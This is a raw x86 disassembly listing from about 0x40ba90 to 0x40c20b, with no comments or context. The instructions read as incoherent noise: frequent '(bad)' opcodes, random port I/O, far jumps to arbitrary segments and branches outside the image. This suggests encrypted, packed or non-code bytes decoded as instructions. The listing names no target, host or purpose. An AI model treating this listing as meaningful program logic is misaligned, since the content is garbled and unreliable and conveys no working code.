  40ba90:	mov    WORD PTR [esi],?
  40ba92:	out    0x88,al
  40ba94:	pop    ss
  40ba95:	mov    al,ds:0xa120e9b0
  40ba9a:	adc    DWORD PTR [edi+ebx*4-0x7b],edx
  40ba9e:	dec    BYTE PTR [ecx-0x3a]
  40baa1:	add    al,0xe0
  40baa3:	fadd   DWORD PTR [esi-0x30]
  40baa6:	out    dx,eax
  40baa7:	out    dx,al
  40baa8:	dec    eax
  40baa9:	sti    
  40baaa:	imul   ebx,ebp,0xffffffd8
  40baad:	xor    bl,bh
  40baaf:	xor    al,0x4
  40bab1:	pop    eax
  40bab2:	adc    al,BYTE PTR [esi+0x10]
  40bab5:	xchg   DWORD PTR ds:0x28352e0e,edi
  40babb:	xchg   edi,eax
  40babc:	dec    ebx
  40babd:	dec    eax
  40babe:	fstp   DWORD PTR [edi]
  40bac0:	jmp    0x86137adc
  40bac5:	mov    cl,0x89
  40bac7:	in     al,0xda
  40bac9:	fimul  DWORD PTR [esi+0x6f]
  40bacc:	clc    
  40bacd:	lea    ebp,[ebx+edi*4+0x41]
  40bad1:	add    BYTE PTR [ecx],al
  40bad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad4:	xor    BYTE PTR [ebp+esi*2+0x74],dl
  40bad8:	ds push ecx
  40bada:	test   eax,eax
  40badc:	cbw    
  40bade:	aad    0x7f
  40bae0:	sbb    DWORD PTR [esi+edx*2-0x60],esp
  40bae4:	sub    ebx,DWORD PTR [esi+0x6f]
  40bae7:	rcl    BYTE PTR [ebx*4+0x1bfed3bb],1
  40baee:	fstp   DWORD PTR [esi-0x4c]
  40baf1:	das    
  40baf2:	mov    DWORD PTR [ebx+0x35],esp
  40baf5:	jmp    0x40bb26
  40baf7:	or     BYTE PTR [ecx+eiz*2+0xf],dl
  40bafb:	cdq    
  40bafc:	xchg   BYTE PTR [edi-0x151f6106],ah
  40bb02:	pop    edx
  40bb03:	add    dh,BYTE PTR [edx+0x5a56064c]
  40bb09:	mov    ds:0xe4da5694,al
  40bb0e:	and    eax,0x5a229288
  40bb13:	or     bl,BYTE PTR [edx+0x2e339375]
  40bb19:	dec    edx
  40bb1a:	adc    ebp,DWORD PTR [eax+0x44]
  40bb1d:	pop    edx
  40bb1e:	retf   0x7f09
  40bb21:	xchg   edx,eax
  40bb22:	scas   eax,DWORD PTR es:[edi]
  40bb23:	ds mov esi,0xf2fd2fcd
  40bb29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2a:	imul   esi,DWORD PTR [ebp+0x172a16da],0x6a76da19
  40bb34:	scas   al,BYTE PTR es:[edi]
  40bb35:	add    al,0x8e
  40bb37:	mov    ds:0xcfbf7e88,al
  40bb3c:	fcomp  st(0)
  40bb3e:	sbb    BYTE PTR [edi],bh
  40bb40:	hlt    
  40bb41:	mov    bh,0xdf
  40bb43:	(bad)  
  40bb44:	(bad)  
  40bb46:	ror    DWORD PTR [ecx],0x1a
  40bb49:	in     eax,0xf3
  40bb4b:	and    BYTE PTR [ebx+0x4d],ah
  40bb4e:	hlt    
  40bb4f:	inc    esi
  40bb50:	repnz mov ds:0x97f4add6,eax
  40bb56:	jp     0x40bb17
  40bb58:	mov    dl,0x63
  40bb5a:	xor    al,0x6b
  40bb5c:	sbb    eax,0x153de3be
  40bb61:	push   ds
  40bb62:	mov    eax,0x724ad17f
  40bb67:	mov    bh,0x90
  40bb69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb6a:	sub    ebp,ecx
  40bb6c:	fnstsw WORD PTR [ebp+0x2e]
  40bb6f:	inc    edx
  40bb70:	mov    BYTE PTR [edx-0x73468d78],ah
  40bb76:	out    dx,eax
  40bb77:	sti    
  40bb78:	cmp    al,0xf2
  40bb7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb7b:	daa    
  40bb7c:	js     0x40bb74
  40bb7e:	call   0x443248ad
  40bb83:	xchg   esp,eax
  40bb84:	stos   DWORD PTR es:[edi],eax
  40bb85:	push   ebx
  40bb86:	xchg   esp,eax
  40bb87:	sub    edx,DWORD PTR [ebx]
  40bb89:	mov    al,BYTE PTR [ecx]
  40bb8b:	push   0xffffffa9
  40bb8d:	sbb    eax,edi
  40bb8f:	push   edx
  40bb90:	test   DWORD PTR [edi+0x252bb0ae],0xb1d29691
  40bb9a:	out    dx,al
  40bb9b:	push   ebx
  40bb9c:	in     eax,0x6b
  40bb9e:	(bad)  
  40bb9f:	xchg   ecx,eax
  40bba0:	cld    
  40bba1:	dec    esi
  40bba2:	lahf   
  40bba3:	imul   ebp,DWORD PTR [ecx-0x64],0xffffff97
  40bba7:	lock mov cl,0x73
  40bbaa:	dec    esp
  40bbab:	adc    al,0x27
  40bbad:	jmp    0x145b:0x7a7ae63e
  40bbb4:	dec    ebx
  40bbb5:	cmp    eax,0x9ea4799
  40bbba:	cmp    eax,0x32486a29
  40bbbf:	out    dx,eax
  40bbc0:	jmp    0x40bc0c
  40bbc2:	jnp    0x40bb6d
  40bbc4:	jmp    0x40bbc7
  40bbc6:	push   0x3
  40bbc8:	pusha  
  40bbc9:	add    al,0xc8
  40bbcb:	push   cs
  40bbcc:	xchg   ebx,eax
  40bbcd:	jecxz  0x40bbd0
  40bbcf:	mov    dl,0xc0
  40bbd1:	add    eax,0x9e419a68
  40bbd6:	cmp    ecx,DWORD PTR [eax]
  40bbd8:	ret    
  40bbd9:	aad    0x1b
  40bbdb:	cli    
  40bbdc:	loopne 0x40bc3d
  40bbde:	fisttp DWORD PTR [di+0x3011]
  40bbe3:	inc    ebx
  40bbe4:	mov    ebp,0xfcf3a1ea
  40bbe9:	and    ebx,DWORD PTR [edi+0x364772b4]
  40bbef:	jge    0x40bc4e
  40bbf1:	cmp    eax,0x8ddb68be
  40bbf6:	sahf   
  40bbf7:	push   ebx
  40bbf8:	mov    ah,0xfd
  40bbfa:	pop    edx
  40bbfb:	push   0xa2681140
  40bc00:	push   0x1
  40bc02:	test   al,0x8d
  40bc04:	dec    eax
  40bc05:	push   esp
  40bc06:	and    eax,0x6c6c9020
  40bc0b:	or     al,0x50
  40bc0d:	push   ds
  40bc0e:	add    BYTE PTR [ecx+0x61a2042d],dl
  40bc14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc15:	xor    eax,0xafd15955
  40bc1a:	or     BYTE PTR [ebx+0x4a],cl
  40bc1d:	pop    es
  40bc1e:	or     eax,0x182d14c8
  40bc23:	adc    eax,0x1c830a55
  40bc28:	inc    eax
  40bc29:	lds    eax,FWORD PTR ds:0xf3f62078
  40bc2f:	retf   
  40bc30:	mov    edi,0xe18312fe
  40bc35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc36:	clc    
  40bc37:	imul   edi,DWORD PTR [edi],0xfffffff8
  40bc3a:	pop    ebp
  40bc3b:	mov    WORD PTR [edi-0x45fda671],cs
  40bc41:	pop    esi
  40bc42:	sub    eax,DWORD PTR [edx+0x7]
  40bc45:	xchg   BYTE PTR [eax],cl
  40bc47:	fwait
  40bc48:	int    0x26
  40bc4a:	jg     0x40bc47
  40bc4c:	jg     0x40bcc8
  40bc4e:	pop    ds
  40bc4f:	(bad)  
  40bc50:	cli    
  40bc51:	and    edi,esp
  40bc53:	aam    0xcf
  40bc55:	popf   
  40bc56:	mov    ds:0xfd8fdfd5,eax
  40bc5b:	inc    esi
  40bc5c:	test   BYTE PTR ds:0x652120dc,0xc
  40bc63:	hlt    
  40bc64:	cld    
  40bc65:	cwde   
  40bc66:	aaa    
  40bc67:	fdivr  QWORD PTR [edi]
  40bc69:	in     al,0xe3
  40bc6b:	jg     0x40bc66
  40bc6d:	jne    0x40bc87
  40bc6f:	xchg   edi,eax
  40bc70:	fisttp WORD PTR [esi+0x25]
  40bc73:	scas   al,BYTE PTR es:[edi]
  40bc74:	mov    esi,DWORD PTR [esi-0x2abf8c67]
  40bc7a:	repnz cmp edi,esi
  40bc7d:	loop   0x40bcc8
  40bc7f:	ds test eax,0xa8e60871
  40bc86:	(bad)  
  40bc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc88:	sub    BYTE PTR [edi-0x39],dl
  40bc8b:	shr    BYTE PTR [ebx],0xd9
  40bc8e:	and    al,0x2c
  40bc90:	outs   dx,BYTE PTR ds:[esi]
  40bc91:	adc    ebx,edx
  40bc93:	dec    ecx
  40bc94:	loop   0x40bc52
  40bc96:	and    DWORD PTR [ecx+0x5c],ebp
  40bc99:	mov    esi,0x23693667
  40bc9e:	popf   
  40bc9f:	arpl   WORD PTR [eax],si
  40bca1:	xchg   esp,eax
  40bca2:	or     al,BYTE PTR ds:0xe35a8cb8
  40bca8:	xor    DWORD PTR [edi+edx*2],edi
  40bcab:	and    BYTE PTR [ecx+0x43],bl
  40bcae:	mov    ds:0xb125523b,al
  40bcb3:	sbb    ebx,DWORD PTR [ecx]
  40bcb5:	call   0xa6d5e5a
  40bcba:	rcr    edi,1
  40bcbc:	pop    ss
  40bcbd:	int    0xd0
  40bcbf:	int    0x9f
  40bcc1:	sub    DWORD PTR [edi],eax
  40bcc3:	es sti 
  40bcc5:	xchg   esp,eax
  40bcc6:	std    
  40bcc7:	popa   
  40bcc8:	mov    BYTE PTR [eax],0x98
  40bccb:	out    dx,eax
  40bccc:	sub    ebp,DWORD PTR [ecx]
  40bcce:	xchg   ebp,eax
  40bccf:	or     esi,DWORD PTR [eax]
  40bcd1:	aas    
  40bcd2:	jle    0x40bcc9
  40bcd4:	cli    
  40bcd5:	stc    
  40bcd6:	xchg   ecx,eax
  40bcd7:	push   cs
  40bcd8:	mov    ecx,0x46d76d05
  40bcdd:	sar    BYTE PTR [ebp+eax*1-0x2b0c2c2d],0x95
  40bce5:	jnp    0x40bd17
  40bce7:	dec    ebp
  40bce8:	popaw  
  40bcea:	hlt    
  40bceb:	fs xchg ebx,eax
  40bced:	or     ecx,esi
  40bcef:	xor    eax,0xcddbe608
  40bcf4:	sbb    ch,dh
  40bcf6:	jbe    0x40bd03
  40bcf8:	sti    
  40bcf9:	ja     0x40bcd5
  40bcfb:	addr16 push es
  40bcfd:	push   0x72aac71c
  40bd02:	mov    cl,0x26
  40bd04:	push   eax
  40bd05:	or     DWORD PTR [esi+0x5aeaf192],esi
  40bd0b:	pop    ds
  40bd0c:	cmp    al,0xdf
  40bd0e:	push   cs
  40bd0f:	adc    ah,0x58
  40bd12:	push   0xf703ada4
  40bd17:	pop    ebp
  40bd18:	adc    bh,0xb
  40bd1b:	shr    BYTE PTR [eax-0x2d2519f9],cl
  40bd21:	cmp    DWORD PTR [esi+0x8],edx
  40bd24:	adc    BYTE PTR gs:[edx+ebp*2],dl
  40bd28:	mov    ds:0x84821490,al
  40bd2d:	cmp    edi,eax
  40bd2f:	in     eax,0xff
  40bd31:	jl     0x40bcb5
  40bd33:	lods   eax,DWORD PTR ds:[esi]
  40bd34:	lods   eax,DWORD PTR ds:[esi]
  40bd35:	inc    esp
  40bd37:	pop    edi
  40bd38:	sti    
  40bd39:	ror    DWORD PTR [edi],0xb0
  40bd3c:	mov    eax,0x79e780b8
  40bd41:	mov    edx,0x2dced312
  40bd46:	das    
  40bd47:	pop    ebp
  40bd48:	int3   
  40bd49:	and    edx,DWORD PTR ss:[ecx+0x7f2ad5ab]
  40bd50:	in     eax,dx
  40bd51:	scas   eax,DWORD PTR es:[edi]
  40bd52:	mov    esp,0x4be54a93
  40bd57:	cld    
  40bd58:	mov    edi,DWORD PTR [edi-0x4d]
  40bd5b:	int3   
  40bd5c:	jbe    0x40bd4d
  40bd5e:	inc    eax
  40bd5f:	dec    edx
  40bd60:	dec    esp
  40bd61:	(bad)  
  40bd62:	sub    BYTE PTR [eax-0x6f7555dc],bl
  40bd68:	data16 add bh,bl
  40bd6b:	mov    bx,0xfc7c
  40bd6f:	mov    ebx,0x33d99816
  40bd74:	xchg   esi,eax
  40bd75:	shl    edi,1
  40bd77:	pop    ebp
  40bd78:	adc    eax,0xbadbaf20
  40bd7d:	sub    eax,0x9c455449
  40bd82:	test   eax,0xb7b629a9
  40bd87:	pop    ebx
  40bd88:	cld    
  40bd89:	out    dx,al
  40bd8a:	addr16 push ds
  40bd8c:	ins    DWORD PTR es:[di],dx
  40bd8e:	stos   DWORD PTR es:[edi],eax
  40bd8f:	into   
  40bd90:	hlt    
  40bd91:	in     al,dx
  40bd92:	adc    dl,BYTE PTR [ebp+0x5f8114ca]
  40bd98:	xlat   BYTE PTR ds:[ebx]
  40bd99:	mov    ecx,0xe063a414
  40bd9e:	jae    0x40be00
  40bda0:	ja     0x40bd84
  40bda2:	sbb    dh,dl
  40bda4:	int3   
  40bda5:	mov    ebx,0x718abe41
  40bdaa:	push   0x7b
  40bdac:	(bad)  
  40bdad:	push   esp
  40bdae:	fwait
  40bdaf:	(bad)  
  40bdb0:	adc    al,0xd4
  40bdb2:	(bad)  
  40bdb3:	and    eax,0xc30c3a42
  40bdb8:	fsubr  QWORD PTR [ebx]
  40bdba:	xchg   esp,ebp
  40bdbc:	jne    0x40bd4e
  40bdbe:	(bad)  
  40bdbf:	nop
  40bdc0:	fisubr DWORD PTR [ebp+0x5e763868]
  40bdc6:	adc    eax,0x8d0836b0
  40bdcb:	adc    al,0x62
  40bdcd:	adc    eax,0x50461809
  40bdd2:	cs (bad) 
  40bdd4:	int3   
  40bdd5:	into   
  40bdd6:	xor    al,0x9
  40bdd8:	jne    0x40be2c
  40bdda:	xchg   esp,eax
  40bddb:	cmp    al,0xfa
  40bddd:	add    al,0x15
  40bddf:	(bad)  
  40bde0:	loope  0x40bd9c
  40bde2:	add    BYTE PTR [ebp-0x748f6911],bl
  40bde8:	adc    eax,DWORD PTR [ecx+0x8537698]
  40bdee:	inc    eax
  40bdef:	push   0x9
  40bdf1:	addr16 (bad) 
  40bdf3:	std    
  40bdf4:	dec    ebp
  40bdf5:	xor    edi,DWORD PTR [edx]
  40bdf7:	mov    edi,0xc046565a
  40bdfc:	push   edx
  40bdfd:	dec    ecx
  40bdfe:	stc    
  40bdff:	aad    0x87
  40be01:	ret    
  40be02:	loope  0x40be0c
  40be04:	icebp  
  40be05:	out    dx,al
  40be06:	inc    esp
  40be07:	fsub   st,st(6)
  40be09:	cld    
  40be0a:	fnsave [edx]
  40be0c:	add    edi,esi
  40be0e:	mov    esp,0xe3a2e5a2
  40be13:	fadd   QWORD PTR [ecx-0x14]
  40be16:	or     DWORD PTR [ecx-0x3d],esp
  40be19:	mov    esi,0xa9509265
  40be1e:	push   esi
  40be1f:	mov    BYTE PTR [ebx],dl
  40be21:	leave  
  40be22:	aad    0xd5
  40be24:	add    DWORD PTR [eax+0x4d],edi
  40be27:	add    BYTE PTR [ecx+eiz*4],bh
  40be2a:	push   edx
  40be2b:	and    BYTE PTR [ecx],0x74
  40be2e:	in     al,0x69
  40be30:	in     al,dx
  40be31:	jmp    0x2669:0x5c1faaf9
  40be38:	in     eax,dx
  40be39:	xchg   esp,eax
  40be3a:	cmp    eax,0x8cc188d2
  40be3f:	dec    edx
  40be40:	add    bh,BYTE PTR [eax+0x3e]
  40be43:	cmp    BYTE PTR ss:[eax+0x2195e104],cl
  40be4a:	cmp    ah,cl
  40be4c:	outs   dx,DWORD PTR ds:[esi]
  40be4d:	cld    
  40be4e:	into   
  40be4f:	xor    ch,BYTE PTR [edi+0x7e79fc9c]
  40be55:	call   0x7d13b49
  40be5a:	pop    esi
  40be5b:	ja     0x40be7c
  40be5d:	xchg   ebp,eax
  40be5e:	dec    edx
  40be5f:	(bad)
  40be62:	neg    BYTE PTR [ebx+0x30]
  40be65:	mov    dl,0x9e
  40be67:	push   DWORD PTR ds:0xb972bb46
  40be6d:	int3   
  40be6e:	daa    
  40be6f:	ds cli 
  40be71:	push   esi
  40be72:	xchg   edx,eax
  40be73:	cmp    cl,ah
  40be75:	pop    edi
  40be76:	dec    ah
  40be78:	pop    ecx
  40be79:	pop    edx
  40be7a:	std    
  40be7b:	add    ebp,DWORD PTR [ecx]
  40be7d:	rcr    DWORD PTR [eax],1
  40be7f:	pop    ss
  40be80:	mov    al,ds:0xeaf50246
  40be85:	xor    bh,0xbd
  40be88:	mov    ds:0xb8de5bce,eax
  40be8d:	iret   
  40be8e:	adc    dh,BYTE PTR [edx-0x3e645947]
  40be94:	ss scas eax,DWORD PTR es:[edi]
  40be96:	out    0xbb,eax
  40be98:	sub    eax,0xb56a430c
  40be9d:	sbb    al,BYTE PTR [ecx+0x10]
  40bea0:	lock jnp 0x40be42
  40bea3:	stc    
  40bea4:	sub    cl,bh
  40bea6:	pop    ds
  40bea7:	(bad)  [esp+ebp*2-0x6]
  40beab:	xor    eax,0xf8932a94
  40beb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb1:	mov    DWORD PTR es:[edx+ecx*2],edx
  40beb5:	je     0x40be61
  40beb7:	pop    DWORD PTR [edx+0x2babfab5]
  40bebd:	bound  ebp,QWORD PTR ds:0x834e76f7
  40bec3:	sub    ebx,DWORD PTR [ebp-0x5c80773]
  40bec9:	mov    ebp,0xb9c84933
  40bece:	xchg   al,cl
  40bed0:	adc    DWORD PTR [ebx+0x7a],edi
  40bed3:	pushf  
  40bed4:	dec    ebx
  40bed5:	cmc    
  40bed6:	cmp    DWORD PTR [ecx],esp
  40bed8:	and    al,0xdc
  40beda:	in     eax,dx
  40bedb:	in     al,0x9a
  40bedd:	popa   
  40bede:	or     al,BYTE PTR [edx+0x1b]
  40bee1:	adc    edx,DWORD PTR [ebp-0x3516e8b6]
  40bee7:	enter  0x50e1,0x32
  40beeb:	fld1   
  40beed:	xor    DWORD PTR [edi],edi
  40beef:	aaa    
  40bef0:	inc    edi
  40bef1:	sbb    BYTE PTR [esi+0x2c68adc8],ah
  40bef7:	mov    edx,0xfb9da753
  40befc:	ja     0x40be7f
  40befe:	push   edi
  40beff:	bnd ja 0x40bebf
  40bf02:	adc    eax,0xa008376d
  40bf07:	add    al,0x4a
  40bf09:	cli    
  40bf0a:	add    eax,0x9307a041
  40bf0f:	sub    DWORD PTR [edx],ebx
  40bf11:	popa   
  40bf12:	(bad)  
  40bf13:	jb     0x40beeb
  40bf15:	push   ebx
  40bf16:	jecxz  0x40beb8
  40bf18:	mov    cl,0x76
  40bf1a:	mov    edx,0x8888b630
  40bf1f:	mov    ebx,edx
  40bf21:	outs   dx,BYTE PTR ds:[esi]
  40bf22:	cwde   
  40bf23:	ror    BYTE PTR [ebp-0x8a06462],0xb5
  40bf2a:	pop    edi
  40bf2b:	dec    edi
  40bf2c:	or     ah,BYTE PTR [ecx+0x56a98067]
  40bf32:	scas   al,BYTE PTR es:[edi]
  40bf33:	push   esp
  40bf34:	push   0xb76cbab5
  40bf39:	shl    bh,cl
  40bf3b:	jbe    0x40bee2
  40bf3d:	xchg   ecx,eax
  40bf3e:	mov    al,BYTE PTR [ecx]
  40bf40:	jo     0x40bf67
  40bf42:	cmp    eax,0xecc8199a
  40bf47:	mov    edx,0x4301d574
  40bf4c:	sub    al,0xe
  40bf4e:	pop    edx
  40bf4f:	mov    BYTE PTR [ebx],dl
  40bf51:	lea    edi,[edx]
  40bf53:	xor    al,0x12
  40bf55:	dec    eax
  40bf56:	shl    BYTE PTR [ebx-0x3bc5a07e],0x57
  40bf5d:	push   ds
  40bf5e:	cmp    ecx,edi
  40bf60:	repnz (bad) 
  40bf63:	adc    eax,0xde87f87e
  40bf68:	retf   
  40bf69:	mov    ebx,0x5b16fddf
  40bf6e:	jns    0x40bf99
  40bf70:	call   FWORD PTR [esi+0x36fce5f9]
  40bf76:	xor    DWORD PTR [esi+eax*1-0x7d],0x1
  40bf7b:	inc    ecx
  40bf7c:	adc    al,dh
  40bf7e:	jge    0x40bf9f
  40bf80:	jg     0x40bf9d
  40bf82:	xchg   edx,eax
  40bf83:	das    
  40bf84:	icebp  
  40bf85:	das    
  40bf86:	dec    ch
  40bf88:	pop    ecx
  40bf89:	cmp    al,bl
  40bf8b:	add    ebx,eax
  40bf8d:	mov    al,ds:0x3cd92d20
  40bf92:	adc    DWORD PTR [ecx-0x9],esi
  40bf95:	shl    DWORD PTR [esi],0x7f
  40bf98:	in     eax,0x63
  40bf9a:	not    DWORD PTR [ecx-0x57]
  40bf9d:	xchg   esp,eax
  40bf9e:	ins    BYTE PTR es:[edi],dx
  40bf9f:	dec    esi
  40bfa0:	mov    ebx,0x4eca9b22
  40bfa5:	jbe    0x40bfbd
  40bfa7:	ret    
  40bfa8:	and    al,0x26
  40bfaa:	daa    
  40bfab:	daa    
  40bfac:	cmp    edx,edi
  40bfae:	ret    0x3e09
  40bfb1:	test   DWORD PTR [ebp+0x3cfe9097],0x4a1eeae5
  40bfbb:	xchg   ebp,eax
  40bfbc:	jno    0x40bfce
  40bfbe:	sbb    DWORD PTR [esi+0x54fa68f9],0xa5a78813
  40bfc8:	xor    al,0x9e
  40bfca:	dec    ebx
  40bfcb:	mov    dl,0x39
  40bfcd:	jecxz  0x40bf6d
  40bfcf:	xchg   dh,ch
  40bfd1:	test   eax,0x88846258
  40bfd6:	in     eax,dx
  40bfd7:	jno    0x40c047
  40bfd9:	lods   al,BYTE PTR ds:[esi]
  40bfda:	inc    eax
  40bfdb:	cli    
  40bfdc:	or     eax,0x2679784
  40bfe1:	jns    0x40bf97
  40bfe3:	loope  0x40bff5
  40bfe5:	ins    BYTE PTR es:[edi],dx
  40bfe6:	out    0x30,al
  40bfe8:	imul   edi,DWORD PTR [edi+0x25],0xd8e14b10
  40bfef:	daa    
  40bff0:	add    al,0x32
  40bff2:	xchg   ecx,eax
  40bff3:	xchg   esp,eax
  40bff4:	std    
  40bff5:	push   cs
  40bff6:	sahf   
  40bff7:	xchg   edi,eax
  40bff8:	stos   BYTE PTR es:[edi],al
  40bff9:	pusha  
  40bffa:	cmp    ecx,DWORD PTR [ebp-0x294dc32f]
  40c000:	ins    DWORD PTR es:[edi],dx
  40c001:	xchg   ebp,eax
  40c002:	fnsetpm(287 only) 
  40c004:	push   es
  40c005:	fmul   QWORD PTR ds:0xc31ba802
  40c00b:	pop    eax
  40c00c:	mov    ecx,0x6603d26c
  40c011:	adc    DWORD PTR [esp+edx*2-0x58],0x6f
  40c016:	add    DWORD PTR ss:[esi+eax*2-0x45],esp
  40c01b:	sub    al,BYTE PTR [eax-0x280499bf]
  40c021:	arpl   cx,bx
  40c023:	mov    edi,0x16bfc49e
  40c028:	adc    eax,eax
  40c02a:	call   0x5784eed7
  40c02f:	cmp    ebp,DWORD PTR [ecx+0x3d9ccb94]
  40c035:	ja     0x40bfb8
  40c037:	outs   dx,BYTE PTR ds:[esi]
  40c038:	daa    
  40c039:	mov    cl,0x28
  40c03b:	fnstenv [ebx]
  40c03d:	inc    edx
  40c03e:	enter  0x6140,0x99
  40c042:	pop    esi
  40c043:	retf   
  40c044:	or     BYTE PTR [ebx+ebp*1],ah
  40c047:	fnstenv [ecx-0x77]
  40c04a:	(bad)  
  40c04b:	(bad)  
  40c04d:	mov    al,ds:0x229b7485
  40c052:	jg     0x40c063
  40c054:	jmp    0x78d19a7d
  40c059:	js     0x40c01d
  40c05b:	daa    
  40c05c:	test   al,0xec
  40c05e:	in     eax,0xa5
  40c060:	push   ebx
  40c061:	and    eax,0xfc8ffefe
  40c066:	and    DWORD PTR [edi-0x9],edi
  40c069:	loop   0x40c095
  40c06b:	pop    ds
  40c06c:	stc    
  40c06d:	lock jnp 0x40c0d9
  40c070:	xor    al,0xea
  40c072:	test   BYTE PTR [ecx+0x38],ah
  40c075:	push   edx
  40c076:	ins    BYTE PTR es:[edi],dx
  40c077:	jb     0x40c0a0
  40c079:	fs nop
  40c07b:	daa    
  40c07c:	dec    edx
  40c07d:	add    DWORD PTR [esi+edi*4],0xffffffff
  40c081:	jecxz  0x40c0f2
  40c083:	mov    ds:0x7e63ffdf,eax
  40c088:	jmp    0xc7ee:0x17a79fdf
  40c08f:	out    0x15,al
  40c091:	adc    BYTE PTR [edx+0x1f3ea999],al
  40c097:	std    
  40c098:	rcr    BYTE PTR [ebx+edi*2],1
  40c09b:	out    0x9b,eax
  40c09d:	xchg   esi,eax
  40c09e:	loope  0x40c0b4
  40c0a0:	adc    DWORD PTR [esp+ecx*4],edi
  40c0a3:	jmp    0xcc86:0x185f66fd
  40c0aa:	into   
  40c0ab:	into   
  40c0ac:	mov    dl,0xb5
  40c0ae:	fucom  st(6)
  40c0b0:	push   ebx
  40c0b1:	mov    edi,0xd79728f3
  40c0b6:	stos   BYTE PTR es:[edi],al
  40c0b7:	int3   
  40c0b8:	cs in  al,dx
  40c0ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0bb:	push   esp
  40c0bc:	push   ds
  40c0bd:	and    ecx,DWORD PTR [eax]
  40c0bf:	stos   BYTE PTR es:[edi],al
  40c0c0:	and    al,0x89
  40c0c2:	les    eax,FWORD PTR [esi]
  40c0c4:	out    0x48,al
  40c0c6:	xor    edx,DWORD PTR [esi+0x54]
  40c0c9:	pop    es
  40c0ca:	test   eax,0xba773e88
  40c0cf:	mov    dl,0xea
  40c0d1:	mov    ds:0xfd3f5e4c,eax
  40c0d6:	sub    eax,0xb893b432
  40c0db:	stos   BYTE PTR es:[edi],al
  40c0dc:	add    al,0xd9
  40c0de:	arpl   bp,cx
  40c0e0:	cmp    BYTE PTR ds:0x41813216,0x7a
  40c0e7:	fs pushw ss
  40c0ea:	sbb    eax,0xd597a828
  40c0ef:	dec    ebp
  40c0f1:	js     0x40c145
  40c0f3:	jg     0x40c0cb
  40c0f5:	dec    eax
  40c0f6:	cwde   
  40c0f7:	dec    eax
  40c0f8:	in     eax,0xa
  40c0fa:	dec    esp
  40c0fb:	inc    edx
  40c0fc:	(bad)  
  40c0fd:	sbb    ah,BYTE PTR [ecx]
  40c0ff:	add    ah,0x86
  40c102:	xor    edx,DWORD PTR [edi]
  40c104:	(bad)  [ebx-0x24]
  40c107:	inc    edx
  40c108:	cmp    bh,BYTE PTR [ecx-0x1be7e98a]
  40c10e:	aaa    
  40c10f:	fimul  WORD PTR [edx-0x7fe4d44a]
  40c115:	jmp    0x40c115
  40c117:	xor    dl,BYTE PTR [eax]
  40c119:	fbld   TBYTE PTR ds:0xf77efcf4
  40c11f:	cmp    al,0xb7
  40c121:	pop    ebp
  40c122:	dec    ebx
  40c123:	jp     0x40c104
  40c125:	test   al,0x3e
  40c127:	pop    edi
  40c128:	aam    0x6e
  40c12a:	xchg   esp,eax
  40c12b:	imul   esp,DWORD PTR [esi+ebx*4+0xf],0x94ac4b52
  40c133:	push   ss
  40c134:	add    eax,0xcd1abaf8
  40c139:	mov    ecx,0x76e91773
  40c13e:	adc    esi,eax
  40c140:	inc    esp
  40c141:	es out dx,eax
  40c143:	xchg   BYTE PTR [edx-0x69],dl
  40c146:	mov    ch,0x51
  40c148:	retf   0x7348
  40c14b:	test   eax,0x7a48d988
  40c150:	mov    bl,0xcd
  40c152:	xor    BYTE PTR [ebp-0x4d0aaf6c],dl
  40c158:	je     0x40c12b
  40c15a:	inc    ebx
  40c15b:	adc    ah,0x45
  40c15e:	inc    esp
  40c15f:	ins    DWORD PTR es:[edi],dx
  40c160:	loop   0x40c172
  40c162:	cmp    al,0x2
  40c164:	aas    
  40c165:	mov    al,ds:0xeae69e5c
  40c16a:	mov    WORD PTR [edi],bx
  40c16d:	std    
  40c16e:	icebp  
  40c16f:	daa    
  40c170:	cmp    BYTE PTR [edi+0x7e],bh
  40c173:	cmp    DWORD PTR [edi-0x74414803],0xffffffe9
  40c17a:	test   eax,0xf23cccc9
  40c17f:	popf   
  40c180:	mov    al,ds:0xe637dbbf
  40c185:	xlat   BYTE PTR ds:[ebx]
  40c186:	sbb    BYTE PTR [edi-0xcd1a36],bl
  40c18c:	ret    
  40c18d:	(bad)  
  40c18f:	sub    ebx,DWORD PTR [ebp-0x100ce012]
  40c195:	jle    0x40c1f8
  40c197:	test   DWORD PTR [ecx+0x32],esp
  40c19a:	cmpps  xmm4,XMMWORD PTR [ebx-0x690671ae],0x87
  40c1a2:	add    al,0xdf
  40c1a4:	stc    
  40c1a5:	xchg   edi,eax
  40c1a6:	out    dx,al
  40c1a7:	popa   
  40c1a8:	cmp    BYTE PTR [esi+ecx*4],bl
  40c1ab:	call   0x41fbb0ab
  40c1b0:	push   ss
  40c1b1:	stc    
  40c1b2:	(bad)  
  40c1b3:	sbb    eax,0xebd4870e
  40c1b8:	jne    0x40c1e4
  40c1ba:	xchg   ebp,eax
  40c1bb:	or     bh,bh
  40c1bd:	fucomip st,st(7)
  40c1bf:	jle    0x40c142
  40c1c1:	daa    
  40c1c2:	lahf   
  40c1c3:	outs   dx,DWORD PTR ds:[esi]
  40c1c4:	rcr    DWORD PTR [eax],1
  40c1c6:	mov    ebx,0x279529b
  40c1cb:	aas    
  40c1cc:	sbb    BYTE PTR [ebx],ah
  40c1ce:	mov    al,BYTE PTR [eax+0x8]
  40c1d1:	xor    ecx,DWORD PTR [edi+0x7b7d435f]
  40c1d7:	or     eax,0x64530961
  40c1dc:	je     0x40c1db
  40c1de:	xor    al,0x60
  40c1e0:	(bad)  
  40c1e1:	jge    0x40c21e
  40c1e3:	inc    ebp
  40c1e4:	pushf  
  40c1e5:	xchg   BYTE PTR [ecx-0x141db60],cl
  40c1eb:	mov    eax,0xf3cd9896
  40c1f0:	push   ss
  40c1f1:	sbb    BYTE PTR [edi-0x52fe2bb9],ah
  40c1f7:	push   esi
  40c1f8:	or     BYTE PTR [ebx-0x5b6416e6],ah
  40c1fe:	and    edi,DWORD PTR ds:0xe776f10d
  40c204:	add    DWORD PTR [ecx+edx*4-0xe],eax
  40c208:	push   es
  40c209:	or     al,0x87
  40c20b:	add    ecx,DWORD PTR [esi]
